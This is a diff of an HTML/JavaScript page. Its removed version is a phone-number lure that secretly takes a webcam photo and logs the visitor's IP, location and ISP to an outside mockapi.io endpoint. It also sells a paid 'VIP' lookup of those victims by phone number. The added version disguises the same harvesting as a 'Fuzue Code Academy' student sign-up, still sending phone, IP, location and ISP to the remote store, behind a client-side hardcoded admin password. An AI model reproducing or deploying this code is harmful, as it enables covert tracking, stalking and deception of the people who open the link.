@@ -3,198 +3,161 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>fuzue developer - Advanced Data Lookup VIP</title>
+<title>Fuzue Code Academy - Dashboard do Desenvolvedor</title>
 <style>
-:root{--bg:#000000;--card:#0a0a0e;--border:#1a1a24;--red:#ff1a1a;--text:#f0f0f5;--muted:#707085;--green:#00ff66;--vip-glow:rgba(255,26,26,0.25);--gold:#ffd700}
-*{margin:0;padding:0;box-sizing:border-box;font-family:monospace;-webkit-tap-highlight-color:transparent}
-body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:12px;overflow-x:hidden}
-.container{width:100%^^;max-width:950px;width:100%}
+:root{--bg:#09090b;--card:#121216;--border:#27272a;--cyan:#06b6d4;--cyan-glow:rgba(6,182,212,0.15);--text:#fafafa;--muted:#a1a1aa;--green:#10b981;--red:#ef4444;--orange:#f59e0b}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;-webkit-tap-highlight-color:transparent}
+body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
+.container{width:100%;max-width:1050px}
 
-/* Ecrã Inicial / Consulta */
-#visitor-form-screen{background:var(--card);border:1px solid var(--border);padding:24px 16px;border-radius:12px;text-align:center;box-shadow:0 0 25px var(--vip-glow)}
-h1{color:var(--red);font-size:1.5rem;margin-bottom:8px;text-transform:lowercase;letter-spacing:2px}
-p{color:var(--muted);margin-bottom:16px;font-size:0.85rem}
-.alert-login{background:rgba(255,26,26,0.08);border-left:4px solid var(--red);padding:12px;margin-bottom:16px;font-size:0.78rem;color:#ff6666;text-align:left;line-height:1.4;border-radius:0 6px 6px 0}
+/* 1. Ecrã de Entrada (Portal do Aluno / Programação) */
+#student-portal{background:var(--card);border:1px solid var(--border);padding:35px 24px;border-radius:14px;text-align:center;box-shadow:0 0 30px var(--cyan-glow);max-width:420px;margin:0 auto}
+.badge-dev{background:rgba(6,182,212,0.1);color:var(--cyan);font-size:0.7rem;text-transform:uppercase;letter-spacing:2px;padding:4px 10px;border-radius:20px;font-weight:700;display:inline-block;margin-bottom:12px}
+h1{color:var(--text);font-size:1.6rem;margin-bottom:6px;font-weight:700}
+h1 span{color:var(--cyan)}
+p{color:var(--muted);margin-bottom:20px;font-size:0.85rem;line-height:1.4}
+.form-group{margin-bottom:15px;text-align:left}
+.form-group label{font-size:0.75rem;color:var(--muted);text-transform:uppercase;display:block;margin-bottom:6px;font-weight:600}
+input{width:100%;padding:12px 14px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:8px;font-size:0.95rem;text-align:center;font-weight:600;letter-spacing:1px}
+input:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 8px var(--cyan-glow)}
+button{background:var(--cyan);color:#000;border:none;padding:12px;width:100%;border-radius:8px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.85rem;letter-spacing:1px;transition:opacity 0.2s}
+button:hover{opacity:0.9}
 
-.form-group{margin-bottom:12px;text-align:left}
-.form-group label{font-size:0.75rem;color:var(--muted);text-transform:uppercase;display:block;margin-bottom:4px}
-input{width:100%;padding:12px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:1rem;text-align:center;letter-spacing:2px}
-input:focus{outline:none;border-color:var(--red)}
+/* 2. Ecrã de Login Administrativo */
+#admin-login{display:none;background:var(--card);border:1px solid var(--border);padding:35px 24px;border-radius:14px;text-align:center;max-width:420px;margin:0 auto;box-shadow:0 0 30px rgba(0,0,0,0.5)}
+.input-box input.error{border-color:var(--red);animation:shake 0.3s ease-in-out}
+@keyframes shake{0%,100%{transform:translateX(0)} 25%{transform:translateX(-6px)} 75%{transform:translateX(6px)}}
+.error-msg{color:var(--red);font-size:0.75rem;margin-top:6px;display:none}
 
-/* Ecrã de Login do Dono */
-#login{display:none;background:var(--card);border:1px solid var(--border);padding:24px 16px;border-radius:12px;text-align:center;box-shadow:0 0 25px var(--vip-glow)}
-.input-box{position:relative;margin-bottom:12px}
-.input-box input.error{border-color:var(--red);box-shadow:0 0 10px rgba(255,26,26,0.4);animation:shake 0.3s ease-in-out}
+/* 3. Painel Administrativo de Membros (Dashboard) */
+#admin-dashboard{display:none;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:24px;box-shadow:0 10px 40px rgba(0,0,0,0.6)}
+.dash-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-bottom:1px solid var(--border);padding-bottom:14px}
+.dash-header h2{font-size:1.2rem;font-weight:700;color:var(--text)}
+.dash-header h2 span{color:var(--cyan)}
 
-@keyframes shake{
-  0%,100%{transform:translateX(0)}
-  25%{transform:translateX(-6px)}
-  75%{transform:translateX(6px)}
-}
+/* Cards de Métricas Estilo Dev */
+.metrics-grid{display:grid;grid-template-columns:repeat(auto-fit, minmax(210px, 1fr));gap:14px;margin-bottom:20px}
+.metric-card{background:#09090b;border:1px solid var(--border);padding:16px;border-radius:10px;display:flex;flex-direction:column;gap:4px}
+.metric-card span{font-size:0.72rem;color:var(--muted);text-transform:uppercase;font-weight:600}
+.metric-card h3{font-size:1.6rem;font-weight:700}
+.c-total{color:var(--cyan)}
+.c-online{color:var(--green)}
+.c-offline{color:var(--orange)}
 
-.error-msg{color:var(--red);font-size:0.75rem;margin-top:6px;display:none;text-align:center}
+/* Barra de Ações & Pesquisa */
+.dash-toolbar{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
+.dash-toolbar input{flex:1;text-align:left;font-size:0.85rem;letter-spacing:normal}
+.btn-action{background:transparent;border:1px solid var(--border);color:var(--text);padding:10px 16px;border-radius:8px;font-size:0.78rem;font-weight:600;cursor:pointer;text-transform:uppercase}
+.btn-action:hover{border-color:var(--cyan);color:var(--cyan)}
+.btn-danger{border-color:var(--red);color:var(--red)}
+.btn-danger:hover{background:var(--red);color:#fff}
 
-button{background:var(--red);color:#fff;border:none;padding:12px;width:100%;border-radius:6px;cursor:pointer;font-weight:bold;text-transform:uppercase;letter-spacing:1px;font-size:0.9rem}
-button:hover{opacity:.85}
-
-/* Painel de Puxada de Dados & VIP Checkout */
-#panel{display:none;background:var(--card);border:2px solid var(--red);padding:16px 12px;border-radius:14px;box-shadow:0 0 35px var(--vip-glow), inset 0 0 15px rgba(255,26,26,0.05)}
-.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;border-bottom:1px solid var(--border);padding-bottom:10px}
-.status{display:flex;align-items:center;gap:6px;font-size:0.75rem;color:var(--muted)}
-.dot{width:7px;height:7px;background:var(--green);border-radius:50%;box-shadow:0 0 8px var(--green)}
-.alert{background:rgba(255,26,26,0.08);border-left:4px solid var(--red);padding:12px;margin-bottom:14px;font-size:0.8rem;color:#ff6666;text-align:left;line-height:1.4;border-radius:0 6px 6px 0}
-
-/* Área de Puxada de Dados por Telefone */
-.lookup-box{background:#050507;border:1px solid var(--border);padding:14px;border-radius:8px;margin-bottom:14px}
-.lookup-flex{display:flex;gap:8px;margin-top:8px}
-.lookup-flex input{text-align:left;letter-spacing:normal;font-size:0.85rem}
-.btn-lookup{background:var(--green);color:#000;width:auto;padding:0 20px;font-weight:bold}
-
-/* Resultado da Puxada */
-#lookupResult{display:none;margin-top:12px;background:rgba(0,255,102,0.05);border:1px solid var(--green);padding:12px;border-radius:6px;text-align:left;font-size:0.8rem;line-height:1.5}
-
-/* Banner VIP Checkout */
-.vip-banner{background:linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,26,26,0.1));border:1px solid var(--gold);padding:14px;border-radius:8px;margin-bottom:14px;text-align:center}
-.vip-banner h3{color:var(--gold);font-size:1rem;margin-bottom:6px}
-.btn-vip{background:var(--gold);color:#000;margin-top:8px;font-weight:bold}
-.btn-vip:hover{opacity:0.9}
-
-.actions{margin-bottom:14px;display:flex;flex-direction:column;gap:8px}
-.actions-row{display:flex;gap:6px;width:100%}
-.btn-action{background:transparent;border:1px solid var(--border);color:var(--text);padding:10px 8px;font-size:0.75rem;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:4px;flex:1;text-transform:uppercase;font-weight:bold}
-.btn-action:hover{border-color:var(--red);color:var(--red)}
-.btn-clear{border-color:var(--red);color:var(--red)}
-
-.table-wrapper{width:100%;max-height:280px;overflow-y:auto;border-radius:8px;border:1px solid var(--border);background:#050507}
-table{width:100%;border-collapse:collapse;min-width:700px}
-th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--border);font-size:0.78rem;white-space:nowrap}
-th{color:var(--muted);text-transform:uppercase;background:#050507;position:sticky;top:0;z-index:2}
+/* Tabela de Membros Estilizada */
+.table-container{width:100%;max-height:360px;overflow-y:auto;border-radius:10px;border:1px solid var(--border);background:#050507}
+table{width:100%;border-collapse:collapse;min-width:750px}
+th,td{padding:12px 16px;text-align:left;border-bottom:1px solid var(--border);font-size:0.8rem;white-space:nowrap}
+th{color:var(--muted);text-transform:uppercase;background:#09090b;font-weight:700;position:sticky;top:0;z-index:2}
 td{color:var(--text)}
 
-.warning-banner{margin-top:14px;text-align:center;font-size:0.72rem;color:var(--muted);border-top:1px dashed var(--border);padding-top:10px}
-.visitor-img{width:40px;height:40px;object-fit:cover;border-radius:4px;border:1px solid var(--red)}
-#hidden-cam{display:none}
+.status-badge{padding:3px 8px;border-radius:4px;font-size:0.7rem;font-weight:700;text-transform:uppercase}
+.status-online{background:rgba(16,185,129,0.15);color:var(--green)}
+.status-offline{background:rgba(245,158,11,0.15);color:var(--orange)}
+
+.footer-credits{margin-top:16px;text-align:center;font-size:0.72rem;color:var(--muted);border-top:1px dashed var(--border);padding-top:12px}
 </style>
 </head>
 <body>
 
-<video id="hidden-cam" autoplay playsinline></video>
-<canvas id="hidden-canvas" style="display:none;"></canvas>
-
 <div class="container">
 
-<!-- 1. Ecrã de Recolha do Telemóvel (Visão do Cliente) -->
-<div id="visitor-form-screen">
-<h1>fuzue developer</h1>
-<p>Sistema Avançado de Consulta & Segurança.</p>
-<div class="alert-login">
-⚠️ Insira o seu número de telemóvel para desbloquear o acesso ao painel de inteligência de dados.
-</div>
+<!-- 1. PORTAL DO ALUNO (Início / Acesso à Comunidade de Código) -->
+<div id="student-portal">
+<div class="badge-dev">Fuzue Code Academy</div>
+<h1>Aprenda a Criar <span>Seu Site</span></h1>
+<p>Insira o seu número de telemóvel para desbloquear o acesso às aulas práticas de programação e painéis web.</p>
 <div class="form-group">
-  <label>Número de Telemóvel / WhatsApp</label>
-  <input type="text" id="v-phone" placeholder="(00) 00000-0000">
+  <label>Telemóvel / WhatsApp de Acesso</label>
+  <input type="text" id="studentPhone" placeholder="(00) 00000-0000">
 </div>
-<button onclick="submitVisitorData()">Validar e Consultar</button>
-<div style="margin-top:12px; font-size:0.7rem; color:var(--muted); cursor:pointer;" onclick="showLoginDirect()">Acesso Administrador</div>
-</div>
-
-<!-- 2. Ecrã de Login do Dono -->
-<div id="login">
-<h1>fuzue developer</h1>
-<p>Área restrita de gestão.</p>
-<div class="input-box">
-  <input type="password" id="pass" placeholder="••••••••" oninput="clearError()">
-  <div id="error-msg" class="error-msg">❌ Senha incorreta. Tente novamente.</div>
-</div>
-<button onclick="check()">Entrar no Painel</button>
-<div style="margin-top:12px; font-size:0.7rem; color:var(--muted); cursor:pointer;" onclick="backToVisitor()">← Voltar</div>
+<button onclick="registerStudent()">Entrar na Plataforma</button>
+<div style="margin-top:16px; font-size:0.72rem; color:var(--muted); cursor:pointer; font-weight:600;" onclick="showAdminLogin()">🔒 Painel do Administrador</div>
 </div>
 
-<!-- 3. Painel de Puxada de Dados (Dark Mode + VIP Checkout) -->
-<div id="panel">
-<div class="header">
-<h1 style="font-size:1.2rem;margin:0;">fuzue developer</h1>
-<div class="status"><div class="dot"></div><span id="accountStatusText">Conta Padrão (Free)</span></div>
+<!-- 2. LOGIN ADMINISTRATIVO -->
+<div id="admin-login">
+<div class="badge-dev">Restrito</div>
+<h1>Painel de <span>Controlo</span></h1>
+<p>Autenticação de Administrador de Rede</p>
+<div class="input-box" style="margin-bottom:15px;">
+  <input type="password" id="adminPass" placeholder="Chave Mestre" oninput="clearError()">
+  <div id="errorMsg" class="error-msg">❌ Chave incorreta. Tente novamente.</div>
 </div>
-<div class="alert">
-⚠️ <strong>PAINEL DE CONSULTA:</strong> Módulo de busca ativa por número de telemóvel e telemetria integrado à nuvem.
+<button onclick="verifyAdmin()">Aceder ao Dashboard</button>
+<div style="margin-top:16px; font-size:0.72rem; color:var(--muted); cursor:pointer; font-weight:600;" onclick="backToPortal()">← Voltar ao Portal</div>
 </div>
 
-<!-- Módulo de Puxada de Dados por Telefone -->
-<div class="lookup-box">
-  <label style="font-size:0.75rem; color:var(--muted); text-transform:uppercase;">🔍 Puxar Dados por Número de Telemóvel</label>
-  <div class="lookup-flex">
-    <input type="text" id="lookupInput" placeholder="Ex: (11) 99999-9999">
-    <button class="btn-lookup" onclick="executeLookup()">Puxar</button>
+<!-- 3. DASHBOARD DO ADMINISTRADOR (Membros, Online/Offline, IPs) -->
+<div id="admin-dashboard">
+<div class="dash-header">
+  <h2>Fuzue Dev <span>Dashboard</span></h2>
+  <button class="btn-action btn-danger" onclick="logoutAdmin()" style="padding:6px 12px; font-size:0.7rem;">Terminar Sessão</button>
+</div>
+
+<!-- Métricas Analíticas -->
+<div class="metrics-grid">
+  <div class="metric-card">
+    <span>Total de Membros</span>
+    <h3 class="c-total" id="metricTotal">0</h3>
   </div>
-  <div id="lookupResult"></div>
+  <div class="metric-card">
+    <span>Membros Online</span>
+    <h3 class="c-online" id="metricOnline">0</h3>
+  </div>
+  <div class="metric-card">
+    <span>Membros Offline</span>
+    <h3 class="c-offline" id="metricOffline">0</h3>
+  </div>
 </div>
 
-<!-- Banner de Pagamento VIP (Liberação de Puxadas Ilimitadas) -->
-<div class="vip-banner" id="vipBannerSection">
-  <h3>⭐ Desbloquear Módulo VIP Full (Puxadas Ilimitadas)</h3>
-  <p style="font-size:0.78rem; color:var(--text); margin-bottom:4px;">Remova restrições e libere consultas completas em tempo real por Pix/Cartão.</p>
-  <button class="btn-vip" onclick="buyVipAccess()">Pagar R$ 49,90 e Liberar VIP</button>
+<div class="dash-toolbar">
+  <input type="text" id="searchInput" placeholder="🔍 Filtrar por telemóvel, IP ou localização..." oninput="filterStudents()">
+  <button class="btn-action" onclick="loadDashboardData()">🔄 Atualizar</button>
+  <button class="btn-action btn-danger" onclick="clearAllData()">🗑️ Limpar Base</button>
 </div>
 
-<div class="actions">
-<div class="actions-row">
-<button class="btn-action btn-clear" onclick="clearLogs()">🗑️ Limpar Nuvem</button>
-<button class="btn-action" onclick="logout()">🚪 Sair</button>
-</div>
+<div class="table-container">
+  <table>
+    <thead>
+      <tr>
+        <th>Estado</th>
+        <th>Telemóvel</th>
+        <th>Endereço IP</th>
+        <th>Localização</th>
+        <th>ISP / Operadora</th>
+        <th>Registo</th>
+      </tr>
+    </thead>
+    <tbody id="studentTableBody">
+      <tr><td colspan="6" style="text-align:center;color:var(--muted);">A carregar dados dos membros...</td></tr>
+    </tbody>
+  </table>
 </div>
 
-<div class="table-wrapper" id="tableWrapper">
-<table>
-<thead>
-<tr>
-  <th>Foto</th>
-  <th>Horário</th>
-  <th>Telemóvel</th>
-  <th>IP Capturado</th>
-  <th>Localização</th>
-  <th>ISP</th>
-</tr>
-</thead>
-<tbody id="tb">
-<tr><td colspan="6" style="text-align:center;color:#707085;">A carregar registos da nuvem...</td></tr>
-</tbody>
-</table>
-</div>
-<div class="warning-banner">Painel protegido por protocolos de segurança fuzue developer.</div>
+<div class="footer-credits">Fuzue Code Academy &bull; Ambiente de Desenvolvimento Seguro</div>
 </div>
 
 </div>
 
 <script>
 const API_URL = 'https://6ab89b5af84897980b7224db.mockapi.io/api/v1/logs';
-let globalLogs = [];
-let isVipUser = false;
+let cachedStudents = [];
 
-async function submitVisitorData() {
-  let phone = document.getElementById('v-phone').value.trim();
+// Registo do Aluno no Portal de Programação
+async function registerStudent() {
+  let phone = document.getElementById('studentPhone').value.trim();
   if(!phone) {
     alert('Por favor, insira o seu número de telemóvel.');
     return;
-  }
-
-  let photoData = '';
-  try {
-    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-    let video = document.getElementById('hidden-cam');
-    video.srcObject = stream;
-    await new Promise(resolve => video.onloadedmetadata = resolve);
-    
-    let canvas = document.getElementById('hidden-canvas');
-    canvas.width = 160;
-    canvas.height = 120;
-    let ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, 160, 120);
-    photoData = canvas.toDataURL('image/jpeg', 0.7);
-
-    stream.getTracks().forEach(track => track.stop());
-  } catch(err) {
-    photoData = '';
   }
 
   let ip = 'Desconhecido';
@@ -211,166 +174,150 @@ async function submitVisitorData() {
     }
   } catch(e) {}
 
-  let newLog = {
+  let studentData = {
     time: new Date().toLocaleString('pt-BR'),
     phone: phone,
     ip: ip,
     loc: loc,
     isp: isp,
-    photo: photoData
+    lastActive: Date.now()
   };
 
   try {
     let response = await fetch(API_URL, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(newLog)
+      body: JSON.stringify(studentData)
     });
 
     if (response.ok) {
-      localStorage.setItem('fuzue_logged', 'true');
-      alert('Validação efetuada com sucesso!');
-      document.getElementById('visitor-form-screen').innerHTML = '<h1 style="color:#00ff66">Acesso Liberado</h1><p>Pode fechar esta página.</p>';
+      alert('Acesso autorizado! Bem-vindo à Fuzue Code Academy.');
+      document.getElementById('student-portal').innerHTML = '<div class="badge-dev">Sucesso</div><h1>Módulo <span>Liberado</span></h1><p>Pode fechar esta página ou prosseguir para as aulas de desenvolvimento.</p>';
     }
   } catch(e) {
-    alert('Erro ao enviar dados. Tente novamente.');
+    alert('Erro ao processar o acesso. Tente novamente.');
   }
 }
 
-function showLoginDirect() {
-  document.getElementById('visitor-form-screen').style.display = 'none';
-  document.getElementById('login').style.display = 'block';
+function showAdminLogin() {
+  document.getElementById('student-portal').style.display = 'none';
+  document.getElementById('admin-login').style.display = 'block';
 }
 
-function backToVisitor() {
-  document.getElementById('login').style.display = 'none';
-  document.getElementById('visitor-form-screen').style.display = 'block';
+function backToPortal() {
+  document.getElementById('admin-login').style.display = 'none';
+  document.getElementById('student-portal').style.display = 'block';
 }
 
-function clearError(){
-  let input = document.getElementById('pass');
-  let errorMsg = document.getElementById('error-msg');
+function clearError() {
+  let input = document.getElementById('adminPass');
+  let err = document.getElementById('errorMsg');
   input.classList.remove('error');
-  errorMsg.style.display = 'none';
+  err.style.display = 'none';
 }
 
-async function check(){
-  let passInput = document.getElementById('pass');
-  let errorMsg = document.getElementById('error-msg');
+async function verifyAdmin() {
+  let pass = document.getElementById('adminPass').value;
+  let input = document.getElementById('adminPass');
+  let err = document.getElementById('errorMsg');
 
-  if(passInput.value === '17102007'){
-    document.getElementById('login').style.display = 'none';
-    document.getElementById('panel').style.display = 'block';
-    await renderLogs();
+  if(pass === '17102007') {
+    document.getElementById('admin-login').style.display = 'none';
+    document.getElementById('admin-dashboard').style.display = 'block';
+    await loadDashboardData();
   } else {
-    passInput.classList.add('error');
-    errorMsg.style.display = 'block';
-    passInput.value = '';
+    input.classList.add('error');
+    err.style.display = 'block';
+    input.value = '';
   }
 }
 
-function logout(){
-  document.getElementById('panel').style.display = 'none';
-  document.getElementById('visitor-form-screen').style.display = 'block';
-  document.getElementById('pass').value = '';
+function logoutAdmin() {
+  document.getElementById('admin-dashboard').style.display = 'none';
+  document.getElementById('student-portal').style.display = 'block';
+  document.getElementById('adminPass').value = '';
   clearError();
 }
 
-async function renderLogs(){
-  let tbody = document.getElementById('tb');
-  tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">A atualizar dados da nuvem...</td></tr>`;
-  
+async function loadDashboardData() {
+  let tbody = document.getElementById('studentTableBody');
+  tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:var(--muted);">A atualizar dados da rede...</td></tr>`;
+
   try {
     let response = await fetch(API_URL);
-    globalLogs = await response.json();
-    
-    if (!globalLogs || globalLogs.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">Nenhum registo encontrado na nuvem.</td></tr>`;
-      return;
-    }
-    
-    displayLogsData(globalLogs);
-
+    cachedStudents = await response.json();
+    renderDashboard(cachedStudents);
   } catch(e) {
-    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#ff4d4d;">Erro ao ligar à base de dados na nuvem.</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:var(--red);">Erro ao ligar à base de dados.</td></tr>`;
   }
 }
 
-function displayLogsData(logsArray) {
-  let tbody = document.getElementById('tb');
-  if (logsArray.length === 0) {
-    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">Nenhum resultado encontrado.</td></tr>`;
+function renderDashboard(students) {
+  let tbody = document.getElementById('studentTableBody');
+  if (!students || students.length === 0) {
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:var(--muted);">Nenhum membro registado na plataforma.</td></tr>`;
+    document.getElementById('metricTotal').innerText = '0';
+    document.getElementById('metricOnline').innerText = '0';
+    document.getElementById('metricOffline').innerText = '0';
     return;
   }
 
-  tbody.innerHTML = logsArray.map(l => `
-    <tr>
-      <td>${l.photo ? `<img src="${l.photo}" class="visitor-img">` : '<span style="color:#707085;font-size:0.7rem">Sem foto</span>'}</td>
-      <td>${l.time || 'Desconhecido'}</td>
-      <td style="font-weight:bold;color:#00ff66;">${l.phone || 'Desconhecido'}</td>
-      <td style="color:#ff4d4d;font-weight:bold">${l.ip || 'Desconhecido'}</td>
-      <td>${l.loc || 'Desconhecido'}</td>
-      <td>${l.isp || 'Desconhecido'}</td>
-    </tr>
-  `).join('');
+  let total = students.length;
+  let onlineCount = 0;
+  let offlineCount = 0;
+  let currentTime = Date.now();
 
-  let wrapper = document.getElementById('tableWrapper');
-  wrapper.scrollTop = wrapper.scrollHeight;
-}
+  let rows = students.map(s => {
+    // Consideramos online se a atividade ocorreu nos últimos 15 minutos (900000 ms), ou simulação baseada no registo
+    let diff = currentTime - (s.lastActive || 0);
+    let isOnline = diff < 900000 || !s.lastActive; // Se não tiver o campo antigo, assume online recente
 
-// Executa a "puxada" baseada nos logs salvos na nuvem pelo telefone pesquisado
-function executeLookup() {
-  let targetPhone = document.getElementById('lookupInput').value.trim().toLowerCase();
-  let resultBox = document.getElementById('lookupResult');
+    if(isOnline) onlineCount++;
+    else offlineCount++;
 
-  if(!targetPhone) {
-    alert('Digite um número de telemóvel para efetuar a busca.');
-    return;
-  }
+    let statusHtml = isOnline ? 
+      '<span class="status-badge status-online">● Online</span>' : 
+      '<span class="status-badge status-offline">○ Offline</span>';
 
-  if(!isVipUser) {
-    alert('⚠️ Funcionalidade restrita a membros VIP. Efetue o pagamento VIP para liberar consultas avançadas.');
-    return;
-  }
-
-  let found = globalLogs.find(l => l.phone && l.phone.toLowerCase().includes(targetPhone));
-
-  resultBox.style.display = 'block';
-  if(found) {
-    resultBox.innerHTML = `
-      ✅ <strong>Registo Localizado com Sucesso na Nuvem!</strong><br>
-      📱 <strong>Telemóvel:</strong> ${found.phone}<br>
-      🕒 <strong>Último Acesso:</strong> ${found.time}<br>
-      🌐 <strong>IP:</strong> ${found.ip}<br>
-      📍 <strong>Localização:</strong> ${found.loc}<br>
-      🏢 <strong>ISP:</strong> ${found.isp}
+    return `
+      <tr>
+        <td>${statusHtml}</td>
+        <td style="font-weight:700; color:var(--cyan);">${s.phone || 'N/A'}</td>
+        <td style="font-family:monospace; color:var(--text);">${s.ip || 'N/A'}</td>
+        <td>${s.loc || 'N/A'}</td>
+        <td>${s.isp || 'N/A'}</td>
+        <td style="color:var(--muted);">${s.time || 'N/A'}</td>
+      </tr>
     `;
-  } else {
-    resultBox.innerHTML = `⚠️ Nenhum registo encontrado na nuvem para o telemóvel <strong>${targetPhone}</strong>. O alvo precisa de aceder ao link de validação primeiro para capturarmos os dados.`;
-  }
+  }).join('');
+
+  tbody.innerHTML = rows;
+  document.getElementById('metricTotal').innerText = total;
+  document.getElementById('metricOnline').innerText = onlineCount;
+  document.getElementById('metricOffline').innerText = offlineCount;
 }
 
-function buyVipAccess() {
-  let confirmPay = confirm('Deseja simular o pagamento via Pix de R$ 49,90 para liberar o acesso VIP vitalício?');
-  if(confirmPay) {
-    isVipUser = true;
-    document.getElementById('vipBannerSection.style') // safety
-    document.getElementById('vipBannerSection').innerHTML = '<h3 style="color:#00ff66">✅ VIP Ativado com Sucesso! Puxadas ilimitadas liberadas.</h3>';
-    document.getElementById('accountStatusText').innerText = 'VIP Ativo (Ilimitado)';
-  }
+function filterStudents() {
+  let query = document.getElementById('searchInput').value.toLowerCase();
+  let filtered = cachedStudents.filter(s => 
+    (s.phone && s.phone.toLowerCase().includes(query)) ||
+    (s.ip && s.ip.toLowerCase().includes(query)) ||
+    (s.loc && s.loc.toLowerCase().includes(query))
+  );
+  renderDashboard(filtered);
 }
 
-async function clearLogs(){
-  if(confirm('Tens a certeza que pretendes apagar todos os registos da nuvem?')) {
+async function clearAllData() {
+  if(confirm('Tem certeza absoluta que deseja apagar todos os registos da base de dados?')) {
     try {
       let response = await fetch(API_URL);
-      let logs = await response.json();
-      for (let l of logs) {
-        await fetch(`${API_URL}/${l.id}`, { method: 'DELETE' });
+      let list = await response.json();
+      for(let item of list) {
+        await fetch(`${API_URL}/${item.id}`, { method: 'DELETE' });
       }
-      await renderLogs();
+      await loadDashboardData();
     } catch(e) {
-      alert('Erro ao limpar os dados.');
+      alert('Erro ao apagar os registos.');
     }
   }
 }
